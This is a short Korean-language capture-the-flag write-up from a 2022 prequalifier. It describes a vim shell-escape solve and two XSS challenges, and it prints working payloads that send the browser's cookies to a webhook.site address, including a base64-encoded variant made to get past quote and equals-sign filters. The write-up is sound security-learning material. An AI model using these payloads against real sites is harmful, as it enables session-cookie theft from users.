# 2022 Cyber-Guardians CTF Prequal

## Dreamhack Profile
Nickname: suk-6

Email: wsuk.nam@gmail.com

## Solve list
A - Sanity Check!

I - xss-1.0

J - xss-1.3

### Sanity Check!
Netcat으로 원격 서버에 접속하였더니 vim 편집창이 나온다.

vim 편집기에서 !를 붙이고 Shell 명령어를 작성하면 실행되는 기능을 활용하여 루트 디렉토리의 파일을 조회하고 head 명령어로 flag 파일을 불러왔다.

### xss-1.0
로컬 Chrome 안에 쿠키 값이 들어있는데, XSS 취약점을 이용해 이 값을 확인하는 문제이다.

flag 페이지에서 로컬 Chrome을 컨트롤 할 수 있는데 `location.href`를 이용하여 webhook.site로 리다이렉트 시켰다.

이 때 `document.cookie`를 이용하여 브라우저의 쿠키를 URI에 담아서 보냈다.

```<svg/onload=location["href"]="https://webhook.site/webhook-id/?flag="+document["cookie"]>```

### xss-1.3
xss-1.0과 같이 로컬 Chrome 안에 쿠키 값이 들어있는데, XSS 취약점을 이용해 이 값을 확인하는 문제이다.

다만, `'`, `"`, `=`를 필터링하고 있다.

그러므로 xss-1.0에서 사용한 코드를 base64 인코딩 하여 필터링을 우회하고, Flask를 지나 크롬에서 로딩 될 때 디코딩되어 작동되도록 작성하였다.

```
<svg/onload=location.href=`https://webhook.site/webhook-id?flag=`.concat(document.cookie)>

to base64(URL-safe) + JS Decoding Code

<script>document.write(atob(`PHN2Zy9vbmxvYWQ9bG9jYXRpb24uaHJlZj1gaHR0cHM6Ly93ZWJob29rLnNpdGUvd2ViaG9vay1pZD9mbGFnPWAuY29uY2F0KGRvY3VtZW50LmNvb2tpZSk-`))</script>
```